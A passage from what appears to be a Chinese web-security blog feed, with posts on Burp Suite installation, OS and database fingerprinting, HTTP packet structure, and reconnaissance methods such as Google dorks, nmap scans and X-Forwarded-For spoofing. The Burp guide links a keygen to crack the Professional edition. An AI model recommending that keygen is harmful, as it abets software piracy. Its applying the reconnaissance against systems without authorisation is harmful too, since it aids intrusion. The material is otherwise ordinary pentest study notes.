href="https://putdown.top/2022/07/29/SQL%E6%B3%A8%E5%85%A5-Sqlserver/">https://putdown.top/2022/07/29/SQL%E6%B3%A8%E5%85%A5-Sqlserver/</a></p><h1 id="SQL注入-Mysql"><a href="#SQL注入-Mysql" class="headerlink" title="SQL注入- Mysql"></a>SQL注入- Mysql</h1><p><a href="https://putdown.top/2022/07/29/SQL%E6%B3%A8%E5%85%A5-Mysql/">https://putdown.top/2022/07/29/SQL%E6%B3%A8%E5%85%A5-Mysql/</a></p><h1 id="SQL注入-Oracle-amp-Postgresql"><a href="#SQL注入-Oracle-amp-Postgresql" class="headerlink" title="SQL注入- Oracle&amp;Postgresql"></a>SQL注入- Oracle&amp;Postgresql</h1><p><a href="https://putdown.top/2022/07/29/SQL%E6%B3%A8%E5%85%A5-Oracle-Postgresql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">https://putdown.top/2022/07/29/SQL%E6%B3%A8%E5%85%A5-Oracle-Postgresql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</a></p><h1 id="SQL注入-其他注入漏洞"><a href="#SQL注入-其他注入漏洞" class="headerlink" title="SQL注入- 其他注入漏洞"></a>SQL注入- 其他注入漏洞</h1><p><a href="https://putdown.top/2022/07/29/SQL%E6%B3%A8%E5%85%A5-%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">https://putdown.top/2022/07/29/SQL%E6%B3%A8%E5%85%A5-%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</a></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>如果对数据库不精通，那么SQL注入就交给工具吧，如今SQL注入工具已经比较完善了。如果工具注入无法完成，再进行手工注入。总之，SQL注入时，一般以工具为主，手工为辅。<br>SQL注入的危害虽然很大，但是可以完全杜绝，程序开发团队一定要有自己的安全规范模板，因为不可能每个程序员都了解SQL注入，所以团队有一套自己的模板之后，SQL注入会大大减少。比如，碰到SQL语句完全采用“PreparedStatement”类，且必须用参数绑定，如果这样还存在SQL注入，那就是某个程序员没有遵循规范，这样就从安全转移到代码规范问题上，只要遵循规范，不会有问题，这一方法无论是SQL注入，还是后面的其他漏洞，都适用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp Suite 安装</title>
      <link href="/archives/a73cee8b.html"/>
      <url>/archives/a73cee8b.html</url>
      
        <content type="html"><![CDATA[<h1 id="Burp-Suite简介"><a href="#Burp-Suite简介" class="headerlink" title="Burp Suite简介"></a>Burp Suite简介</h1><p>Burp Suite是一个集成化的渗透测试工具，它集合了多种渗透测试组件，使我们自动化地或手工地能更好的完成对web应用的渗透测试和攻击,在渗透测试中，我们使用Burp Suite将使得测试工作变得更加容易和方便，即使在不需要娴熟的技巧的情况下，只有我们熟悉Burp Suite的使用，也使得渗透测试工作变得轻松和高效,Burp Suite是由Java语言编写而成，而Java自身的跨平台性，使得软件的学习和使用更加方便,Burp Suite不像其他的自动化测试工具，它需要你手工的去配置一些参数，触发一些自动化流程，然后它才会开始工作。</p><h1 id="配置JAVA环境"><a href="#配置JAVA环境" class="headerlink" title="配置JAVA环境"></a>配置JAVA环境</h1><p>因为burpsuite是在JAVA环境下运行的，所以首先应该配置好JAVA环境.</p><ul><li>下载地址:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.oracle.com/java/technologies/downloads/</span><br></pre></td></tr></table></figure></li></ul><ol><li>下载好后一直点下一步安装(记住安装目录).</li><li>右键桌面上“我的电脑”&gt;&gt;“属性”，在弹出的页面上点击“高级系统设置”。</li><li>在弹出的“系统属性”窗口中“高级”标签页下点击“环境变量”按钮。</li><li>在弹出的“环境变量”窗口中，点击下方的“新建”按钮，在弹出的“新建系统变量”窗口中，新建一个名为“JAVA_HOME”的环境变量，变量值为Java的安装路径，本人为：<code>C:\Program Files\Java\jdk-13.0.2\bin</code>。</li><li>设置Path环境变量，该变量已经存在，所以在列表中选择Path，点击下方的“编辑”按钮，在弹出的窗口中添加如下信息：<code> %JAVA_HOME%\bin</code>;<code>%JAVA_HOME%\jre\bin</code>，然后点击“确认”按钮即可。</li><li>和JAVA_HOME一样，新建一个名为<code>classpath</code>的环境变量，变量值为：<code>%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar</code>。</li><li>在配置好环境变量后，可以进入cmd中检查Java是否安装正确，检查的命令为 <code>java -version</code></li></ol><h1 id="二、安装Burpsuite"><a href="#二、安装Burpsuite" class="headerlink" title="二、安装Burpsuite"></a>二、安装Burpsuite</h1><h2 id="Burpsuite下载地址"><a href="#Burpsuite下载地址" class="headerlink" title="Burpsuite下载地址:"></a>Burpsuite下载地址:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://portswigger.net/burp/releases</span><br></pre></td></tr></table></figure><p>建议下载<code>Professional.jar</code>版本</p><h2 id="激活工具"><a href="#激活工具" class="headerlink" title="激活工具"></a>激活工具</h2><pre><code>https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases</code></pre><h1 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h1><ol><li>安装好后打开 Burp Suite </li><li>出现弹框,继续点击<code>I Accept</code>后</li><li>打开激活工具</li><li><code> ctrl + A</code>复制<code>Lisence</code>中的内容</li><li><code>LISENCE</code>复制的内容粘贴到弹出的框中,然后点击<code>Next</code>。</li><li>点击<code>Manual activation</code></li><li>点击<code>Copy request</code></li><li>回到回到激活工具,把内容粘贴到<code>Activation Request:</code></li><li><code>Activation Response</code>一栏会自动生成,<code> ctrl + A</code>复制</li><li>回到Burp Suite把复制的内容粘贴到<code>Paste response</code></li><li>然后点击<code>next</code></li><li>接着点击<code>finish</code>，进入到软件的页面</li><li>点击<code>next</code></li><li>接着点击<code>start burp</code></li><li>结束<h2 id="启动方式"><a href="#启动方式" class="headerlink" title="启动方式"></a>启动方式</h2>第一种: 打开激活工具.点击<code>run</code><br>第二中:网上有<code>bat</code>和<code>vbs</code>脚本,请自行百度查找.<h1 id="各个板块简介"><a href="#各个板块简介" class="headerlink" title="各个板块简介"></a>各个板块简介</h1><h2 id="汉化版请自行查找甄别"><a href="#汉化版请自行查找甄别" class="headerlink" title="汉化版请自行查找甄别"></a>汉化版请自行查找甄别</h2><img src="/img/Snipaste_2022-07-22_17-03-46.png"></li></ol><ul><li>dashboard：仪表盘，用于显示任务、日志信息</li><li>Target: 提供显示目标目录结构的功能</li><li>Proxy:拦截HTTP&#x2F;s请求的代理服务器，作为web浏览器与服务器的中间人，允许拦截、修改数据流</li><li>intruder：入侵模块，提供高精度的可配置工具，可进行爆破攻击、获取信息以及使用fuzzing技术探测漏洞等</li><li>repeater：中继器，通过手动来触发单词HTTP请求，并分析应用程序的响应包</li><li>sequence：会话模块，用于分析那些不可预知的应用程序会话令牌和重要数据的随机性的工具。</li><li>decoder：解码器</li><li>compare：对比模块，对数据进行差异化分析</li><li>extender:拓展模块，可以加载BP拓展模块和第三方代码</li><li>option：设置模块，可以设置项目、用户等信息。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统&amp;数据库</title>
      <link href="/archives/4644d087.html"/>
      <url>/archives/4644d087.html</url>
      
        <content type="html"><![CDATA[<h1 id="操作系统-amp-数据库"><a href="#操作系统-amp-数据库" class="headerlink" title="操作系统&amp;数据库"></a>操作系统&amp;数据库</h1><img src="/img/系统&数据库 (2).jpeg"><h1 id="操作系统层面"><a href="#操作系统层面" class="headerlink" title="操作系统层面"></a>操作系统层面</h1><h2 id="识别操作系统常见方法"><a href="#识别操作系统常见方法" class="headerlink" title="识别操作系统常见方法"></a>识别操作系统常见方法</h2><ul><li>看字母大小写，windows对大小写不敏感，Linux敏感</li><li>看ping值 –ttl在64左右是linux –ttl在128左右是windows<blockquote><blockquote><p>UNIX及类UNIX操作系统ICMP回显应答的TTL字段值为255<br>Compaq Tru64 5.0 ICMP回显应答的 TTL字段值为64<br>微软Windows NT&#x2F;2K操作系统ICMP回显应答的TTL字段值为128<br>微软Windows 95操作系统ICMP回显应答的 TTL字段值为32<br>LINUX Kernel 2.2.x &amp; 2.4.x ICMP 回显应答的 TTL 字段值为 64</p></blockquote></blockquote></li><li>nmap -O ip</li></ul><h2 id="简要两者区别及识别意义情况"><a href="#简要两者区别及识别意义情况" class="headerlink" title="简要两者区别及识别意义情况"></a>简要两者区别及识别意义情况</h2><ul><li>可以帮助我们明确思路</li><li>可以筛选掉不符合系统的情况<h2 id="操作系统层面漏洞类型对应意义"><a href="#操作系统层面漏洞类型对应意义" class="headerlink" title="操作系统层面漏洞类型对应意义"></a>操作系统层面漏洞类型对应意义</h2></li><li>覆盖面广</li><li>获取的权限高</li><li>危害性大</li></ul><h1 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h1><h2 id="识别数据库类型常见方法"><a href="#识别数据库类型常见方法" class="headerlink" title="识别数据库类型常见方法"></a>识别数据库类型常见方法</h2><ul><li><p>nmap -O ip</p></li><li><p>nmap ip -p 端口，通过端口开放反推数据库</p><h2 id="数据库类型区别及识别意义"><a href="#数据库类型区别及识别意义" class="headerlink" title="数据库类型区别及识别意义"></a>数据库类型区别及识别意义</h2></li><li><p>数据库的漏洞和类型相性很强</p></li><li><p>不同数据库漏洞爆发点不太一样</p></li><li><p>能确定数据库类型、版本，会对渗透有很大帮助</p><h2 id="数据库常见漏洞类型及攻击"><a href="#数据库常见漏洞类型及攻击" class="headerlink" title="数据库常见漏洞类型及攻击"></a>数据库常见漏洞类型及攻击</h2></li><li><p>弱口令</p></li><li><p>sql注入</p><h2 id="简要数据库层面漏洞影响范围"><a href="#简要数据库层面漏洞影响范围" class="headerlink" title="简要数据库层面漏洞影响范围"></a>简要数据库层面漏洞影响范围</h2><p>要参考数据库的重要程来判定影响范围</p><h2 id="常见的数据库结构"><a href="#常见的数据库结构" class="headerlink" title="常见的数据库结构"></a>常见的数据库结构</h2></li><li><p>ASP+Access</p></li><li><p>php+mysql</p></li><li><p>axpx+mssql</p></li><li><p>jsp+mssql，oracle</p></li><li><p>python+mongodb</p><h2 id="服务器端口"><a href="#服务器端口" class="headerlink" title="服务器端口"></a>服务器端口</h2></li><li><p>关系型数据库 –MySQL:3306 –SqlServer:1433 –Oracle:1521</p></li><li><p>NOSQL数据库 –MongoDB:27017 –Redis:6379 –memcached:11211</p><h2 id="第三方"><a href="#第三方" class="headerlink" title="第三方"></a>第三方</h2></li><li><p>如何判断那些有第三方平台或软件 – 端口扫描 – 特征匹配</p></li><li><p>简要为什么要识别第三方平台或软件 – 可以提供额外的攻击面</p></li><li><p>常见第三方平台或软件漏洞类型及攻击 – 弱口令</p></li><li><p>简要第三方平台或软件安全测试的范围</p></li><li><p>除去常规WEB安全及APP安全测试外，类似服务器单一或复杂的其他服务( 邮件，游戏，负载均衡等)，也可以作为安全测试目标，此类目标测试原则只是少了WEB应用或其他安全问题。所以明确安全测试思路是很重要的!</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统&amp;数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http数据包</title>
      <link href="/archives/4b510cae.html"/>
      <url>/archives/4b510cae.html</url>
      
        <content type="html"><![CDATA[<h1 id="Https-x2F-Http"><a href="#Https-x2F-Http" class="headerlink" title="Https&#x2F;Http"></a>Https&#x2F;Http</h1><img src="/img/Https.Http.png"><ul><li>HTTPS协议需要到CA申请证书，一般免费证书很少，需要交费。</li><li>HTTP协议运行在TCP之上，所有传输的内容都是明文，HTTPS运行在SSL&#x2F;TLS之上，SSL&#x2F;TLS运行在TCP之上，所有传输的内容都经过加密的。</li><li>HTTP和HTTPS使用的是完全不同的连接方式，用的端口也不一样，HTTP是80，HTTPS是443。</li><li>HTTPS可以有效的防止运营商劫持，解决了防劫持的一个大问题。</li></ul><h1 id="Request-请求数据包数据格式"><a href="#Request-请求数据包数据格式" class="headerlink" title="Request 请求数据包数据格式"></a>Request 请求数据包数据格式</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Request Headers</span><br><span class="line">POST /adduser HTTP/1.1</span><br><span class="line">Host: localhost:8030</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Origin: chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcm</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)</span><br><span class="line">Chrome/66.0.3359.181 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure><h2 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h2><p>请求行由三个标记组成：请求方法;请求 URL;HTTP 版本，它们用空格分享。<br>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br></pre></td></tr></table></figure><h2 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h2><ul><li>常见的几种请求方法:<br>GET、POST、COOKIE、OPTIONS、PUT、MOVE、DELETE、TRACE</li><li>服务器端的接受:<br>GET、POST、COOKIE、REQUEST</li></ul><hr><ul><li>HTTP 规划定义了 8 种可能的请求方法：<blockquote><p>GET：检索 URL 中标识资源的一个简单请求<br>HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档<br>POST：服务器接受被写入客户端输出流中的数据的请求<br>PUT：服务器保存请求数据作为指定 URL 新内容的请求<br>DELETE：服务器删除 URL 中命令的资源的请求<br>OPTIONS：关于服务器支持的请求方法信息的请求<br>TRACE：web 服务器反馈 Http 请求和其头标的请求<br>CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理</p></blockquote></li></ul><hr><h2 id="HTTP-Request-Header-请求头"><a href="#HTTP-Request-Header-请求头" class="headerlink" title="HTTP Request Header 请求头"></a>HTTP Request Header 请求头</h2><ul><li>由关键字&#x2F;值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。<br>Accept：指定客户端能够接收的内容类型。<br>Accept-Charset：浏览器可以接受的字符编码集。<br>Accept-Encoding：指定浏览器可以支持的web服务器返回内容压缩编码类型。<br>Accept-Language：浏览器可接受的语言。<br>Accept-Ranges：可以请求网页实体的一个或者多个子范围字段。<br>AuthorizationHTTP：授权的授权证书。<br>Cache-Control：指定请求和响应遵循的缓存机制。<br>Connection：表示是否需要持久连接。（HTTP 1.1默认进行持久连接）<br>CookieHTTP：请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。<br>Content-Length：请求的内容长度。<br>Content-Type：请求的与实体对应的MIME信息。<br>Date：请求发送的日期和时间。<br>Expect：请求的特定的服务器行为。<br>From：发出请求的用户的Email。<br>Host：指定请求的服务器的域名和端口号。<br>If-Match：只有请求内容与实体相匹配才有效。<br>If-Modified-Since：如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码。<br>If-None-Match：如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变。<br>If-Range：如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。<br>If-Unmodified-Since：只在实体在指定时间之后未被修改才请求成功。<br>Max-Forwards：限制信息通过代理和网关传送的时间。<br>Pragma：用来包含实现特定的指令。<br>Proxy-Authorization：连接到代理的授权证书。<br>Range：只请求实体的一部分，指定范围。<br>Referer：先前网页的地址，当前请求网页紧随其后,即来路。<br>TE：客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息。<br>Upgrade：向服务器指定某种传输协议以便服务器进行转换（如果支持。<br>User-AgentUser-Agent：的内容包含发出请求的用户信息。<br>Via：通知中间网关或代理服务器地址，通信协议。<br>Warning：关于消息实体的警告信息</li></ul><hr><ul><li><p>空行:最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</p></li><li><p>请求数据:使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。  </p></li><li><p>GET 对比 POST : <a href="https://www.runoob.com/tags/html-httpmethods.html">https://www.runoob.com/tags/html-httpmethods.html</a></p></li></ul><h1 id="Response-返回数据包数据格式"><a href="#Response-返回数据包数据格式" class="headerlink" title="Response 返回数据包数据格式"></a>Response 返回数据包数据格式</h1><h2 id="Response-请求数据包数据格式"><a href="#Response-请求数据包数据格式" class="headerlink" title="Response 请求数据包数据格式"></a>Response 请求数据包数据格式</h2><ul><li>一个响应由四个部分组成；状态行、响应头标、空行、响应数据。</li></ul><p>1.状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔<br>2.响应头标：包含服务器类型、日期、长度、内容类型等<br>3.空行：响应头与响应体之间用空行隔开<br>4.响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面</p><h2 id="HTTP-响应码："><a href="#HTTP-响应码：" class="headerlink" title="HTTP 响应码："></a>HTTP 响应码：</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/202207150942458.png"></p><p>更多: <a href="https://www.runoob.com/http/http-status-codes.html">https://www.runoob.com/http/http-status-codes.html</a></p><h1 id="MIME-类型"><a href="#MIME-类型" class="headerlink" title="MIME 类型"></a>MIME 类型</h1><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。<br>MIME 的组成结构非常简单，由类型与子类型两个字符串中间用 &#x2F; 分隔而组成，不允许有空格。type 表示可以被分多个子类的独立类别，subtype 表示细分后的每个类型。<br>MIME类型对大小写不敏感，但是传统写法都是小写。<br>两种主要的 MIME 类型在默认类型中扮演了重要的角色：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text/plain 表示文本文件的默认值。</span><br><span class="line">application/octet-stream 表示所有其他情况的默认值。</span><br></pre></td></tr></table></figure><p>MIME 类型通用结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type/subtype</span><br></pre></td></tr></table></figure><p>更多MIME对照表: <a href="https://www.runoob.com/http/mime-types.html">https://www.runoob.com/http/mime-types.html</a></p><h2 id="常见的-MIME-类型"><a href="#常见的-MIME-类型" class="headerlink" title="常见的 MIME 类型"></a>常见的 MIME 类型</h2><p>超文本标记语言文本 .html、.html：text&#x2F;html<br>普通文本 .txt： text&#x2F;plain<br>RTF 文本 .rtf： application&#x2F;rtf<br>GIF 图形 .gif： image&#x2F;gif<br>JPEG 图形 .jpeg、.jpg： image&#x2F;jpeg<br>au 声音文件 .au： audio&#x2F;basic<br>MIDI 音乐文件 mid、.midi： audio&#x2F;midi、audio&#x2F;x-midi<br>RealAudio 音乐文件 .ra、.ram： audio&#x2F;x-pn-realaudio<br>MPEG 文件 .mpg、.mpeg： video&#x2F;mpeg<br>AVI 文件 .avi： video&#x2F;x-msvideo<br>GZIP 文件 .gz： application&#x2F;x-gzip<br>TAR 文件 .tar： application&#x2F;x-tar</p><h1 id="HTTP头中安全隐患"><a href="#HTTP头中安全隐患" class="headerlink" title="HTTP头中安全隐患"></a>HTTP头中安全隐患</h1><p>在PHP中通过会使用$_SERVER[“HTTP_CLIENT_IP”]或者$_SERVER[“HTTP_X_FORWARDED_FOR”]来获取IP。<br>因此，我们就可以通过修改http头中的’ X-Forwarded-For: ‘ ‘ client-ip：’来进行攻击。<br>例如：<br>1、突破服务器访问限制ip<br>2、http头注入攻击等。</p>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/archives/312e3d12.html"/>
      <url>/archives/312e3d12.html</url>
      
        <content type="html"><![CDATA[<p>WEB安全测试信息收集</p><h1 id="常规信息收集讲解"><a href="#常规信息收集讲解" class="headerlink" title="常规信息收集讲解"></a>常规信息收集讲解</h1><ul><li>单个目标服务器（非web）</li><li>Web服务器</li><li>整个网络拓扑</li><li>内网：<blockquote><p>网络设备：交换机、路由器、防火墙、ids、等<br>网络中的服务器：文件服务器、dns、http、域控制器等</p></blockquote></li><li>外网：<blockquote><p>相关联的其他服务器（ip关联、服务关联）<br>旁站、c段、邮件服务器、dns服务器、代理服务器等</p></blockquote></li></ul><h1 id="web方向信息收集"><a href="#web方向信息收集" class="headerlink" title="web方向信息收集"></a>web方向信息收集</h1><h2 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h2><h3 id="对应ip收集"><a href="#对应ip收集" class="headerlink" title="对应ip收集:"></a>对应ip收集:</h3><pre><code>&gt;相关域名对应ip，相关工具：nslookup、一些工具网站</code></pre><h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集:"></a>子域名收集:</h3><pre><code>&gt;工具：layer、subDomainsBrute</code></pre><h3 id="whois（注册人）信息查询"><a href="#whois（注册人）信息查询" class="headerlink" title="whois（注册人）信息查询:"></a>whois（注册人）信息查询:</h3><pre><code>&gt; 根据已知域名反查，分析出此域名的注册人、邮箱、电话等&gt; 工具：爱站网、站长工具、微步在线（https://x.threatbook.cn）&gt; site.ip138.com、searchdns.netcraft.com</code></pre><h2 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h2><h3 id="收集方向"><a href="#收集方向" class="headerlink" title="收集方向"></a>收集方向</h3><pre><code>&gt; robots.txt、后台目录、安装包、上传目录、mysql管理接口、安装页面、phpinfo、编辑器、iis短文件,分析网站cms</code></pre><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><pre><code>&gt; 字典爆破 &gt;&gt; 御剑、dirbuster、wwwscan、IIS_shortname_Scanner等&gt; 蜘蛛爬行 &gt;&gt; 爬行菜刀、webrobot，burp等</code></pre><h2 id="旁站C段"><a href="#旁站C段" class="headerlink" title="旁站C段"></a>旁站C段</h2><h3 id="旁站：同服务器其他站点"><a href="#旁站：同服务器其他站点" class="headerlink" title="旁站：同服务器其他站点"></a>旁站：同服务器其他站点</h3><h3 id="C段：同一网段其他服务器"><a href="#C段：同一网段其他服务器" class="headerlink" title="C段：同一网段其他服务器"></a>C段：同一网段其他服务器</h3><h3 id="收集方向："><a href="#收集方向：" class="headerlink" title="收集方向："></a>收集方向：</h3><pre><code>&gt; 域名、端口、目录</code></pre><h3 id="常用工具："><a href="#常用工具：" class="headerlink" title="常用工具："></a>常用工具：</h3><pre><code>&gt; web : 目录扫描工具&gt; 端口 : portscan</code></pre><h2 id="整站分析"><a href="#整站分析" class="headerlink" title="整站分析"></a>整站分析</h2><h3 id="服务器类型"><a href="#服务器类型" class="headerlink" title="服务器类型:"></a>服务器类型:</h3><pre><code>&gt; 服务器平台、版本等</code></pre><h3 id="网站容器"><a href="#网站容器" class="headerlink" title="网站容器"></a>网站容器</h3><pre><code>&gt; 搭建网站的服务组件，例如：iis、Apache、nginx、tomcat等</code></pre><h3 id="脚本类型"><a href="#脚本类型" class="headerlink" title="脚本类型"></a>脚本类型</h3><pre><code>&gt; ASP、PHP、JSP、aspx等</code></pre><h3 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h3><pre><code>&gt; access、sqlserver、mysql、oracle、postgresql等</code></pre><h3 id="CMS类型"><a href="#CMS类型" class="headerlink" title="CMS类型"></a>CMS类型</h3><h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><h2 id="谷歌hacker"><a href="#谷歌hacker" class="headerlink" title="谷歌hacker"></a>谷歌hacker</h2><ul><li>Intext:      <blockquote><p>查找网页中含有xx关键字的网站             例：Intext：管理员登录</p></blockquote></li><li>Intitle：  <blockquote><p>查找某个标题                        例：intitle：后台登录</p></blockquote></li><li>Filetype： <blockquote><p>查找某个文件类型的文件                     例：数据挖掘 filetype：doc</p></blockquote></li><li>Inurl:  <blockquote><p>查找url中带有某字段的网站          例：inurl：php?id&#x3D; </p></blockquote></li><li>Site：       <blockquote><p>在某域名中查找信息  </p></blockquote></li><li>往期文章<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://putdown.top/2022/06/25/%E8%B0%B7%E6%AD%8CHacker%E8%AF%AD%E6%B3%95/</span><br></pre></td></tr></table></figure><h2 id="url采集"><a href="#url采集" class="headerlink" title="url采集"></a>url采集</h2><h3 id="采集相关url的同类网站"><a href="#采集相关url的同类网站" class="headerlink" title="采集相关url的同类网站"></a>采集相关url的同类网站</h3><blockquote><p>例如：<br>php?id&#x3D;<br>漏洞网站<br>相同某种指纹网站</p></blockquote><h3 id="常用工具-1"><a href="#常用工具-1" class="headerlink" title="常用工具"></a>常用工具</h3><h3 id="谷歌hacker-1"><a href="#谷歌hacker-1" class="headerlink" title="谷歌hacker"></a>谷歌hacker</h3><h3 id="url采集器"><a href="#url采集器" class="headerlink" title="url采集器"></a>url采集器</h3><h2 id="服务器方向信息收集"><a href="#服务器方向信息收集" class="headerlink" title="服务器方向信息收集"></a>服务器方向信息收集</h2><h3 id="服务信息收集："><a href="#服务信息收集：" class="headerlink" title="服务信息收集："></a>服务信息收集：</h3><blockquote><p>网络服务：web&#x2F;ftp&#x2F;telnet&#x2F;ssh&#x2F;mail&#x2F;mysql&#x2F;mssql&#x2F;oracle&#x2F;rdp<br>服务版本，漏洞等相关信息收集</p></blockquote><h3 id="系统版本信息收集"><a href="#系统版本信息收集" class="headerlink" title="系统版本信息收集"></a>系统版本信息收集</h3></li></ul><h1 id="网络设备信息收集"><a href="#网络设备信息收集" class="headerlink" title="网络设备信息收集"></a>网络设备信息收集</h1><ul><li>网络开放端口</li><li>路由</li><li>防火墙</li><li>代理服务器等相关设备的收集</li><li>shodan</li></ul><h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h3><ul><li>shodan网络搜索引擎偏向网络设备以及服务器的搜索。</li><li>地址：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.shodan.io/</span><br></pre></td></tr></table></figure><h3 id="censys"><a href="#censys" class="headerlink" title="censys"></a>censys</h3></li><li>censys搜索引擎功能与shodan类似。</li><li>地址：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.censys.io/</span><br></pre></td></tr></table></figure><h3 id="censys-1"><a href="#censys-1" class="headerlink" title="censys"></a>censys</h3></li><li>FoFa搜索引擎偏向资产搜索。</li><li>地址：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://fofa.so</span><br></pre></td></tr></table></figure><h3 id="钟馗之眼"><a href="#钟馗之眼" class="headerlink" title="钟馗之眼"></a>钟馗之眼</h3></li><li>钟馗之眼搜索引擎偏向web应用层面的搜索。</li><li>地址：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.zoomeye.org/</span><br></pre></td></tr></table></figure></li></ul><h1 id="APP及其他资产"><a href="#APP及其他资产" class="headerlink" title="APP及其他资产"></a>APP及其他资产</h1><p>在安全测试中，若WEB无法取得进展或无WEB的情况下，我们需要借助APP或其他资产在进行信息收集,从而开展后续渗透</p><h2 id="APE提取一键反编译提取"><a href="#APE提取一键反编译提取" class="headerlink" title="APE提取一键反编译提取"></a>APE提取一键反编译提取</h2><p>使用反编译工具，尝试获取包了里的源码</p><h2 id="APP抓数据包进行工具配合"><a href="#APP抓数据包进行工具配合" class="headerlink" title="APP抓数据包进行工具配合"></a>APP抓数据包进行工具配合</h2><p>使用burp suite设置代理，或者wireshark抓数据包，进行分析</p><h2 id="各种第三方应用相关探针技术"><a href="#各种第三方应用相关探针技术" class="headerlink" title="各种第三方应用相关探针技术"></a>各种第三方应用相关探针技术</h2><p><a href="https://www.shodan.io/">https://www.shodan.io/</a><br><a href="https://fofa.so/">https://fofa.so/</a></p><h2 id="各种服务接口信息相关探针技术"><a href="#各种服务接口信息相关探针技术" class="headerlink" title="各种服务接口信息相关探针技术"></a>各种服务接口信息相关探针技术</h2><h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><p>使用burp代理模拟器时，提示证书错误，后将burp生成的证书导入后正常，导入时需要将.cer改成.der。</p><h1 id="后台查找总结"><a href="#后台查找总结" class="headerlink" 